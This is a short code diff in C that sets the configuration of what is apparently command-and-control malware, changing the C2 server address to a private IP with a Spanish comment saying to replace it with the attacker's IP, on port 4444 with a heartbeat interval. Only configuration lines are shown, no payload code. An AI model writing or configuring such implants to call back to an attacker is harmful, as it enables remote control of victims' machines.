@@ -28,7 +28,7 @@
 // ============================================================================
 // CONFIGURACIÓN
 // ============================================================================
-#define C2_SERVER "127.0.0.1"  // REEMPLAZAR CON IP DEL ATACANTE
+#define C2_SERVER "192.168.254.137"  // REEMPLAZAR CON IP DEL ATACANTE
 #define C2_PORT 4444
 #define HEARTBEAT_INTERVAL 5
 #define BUFFER_SIZE 8192
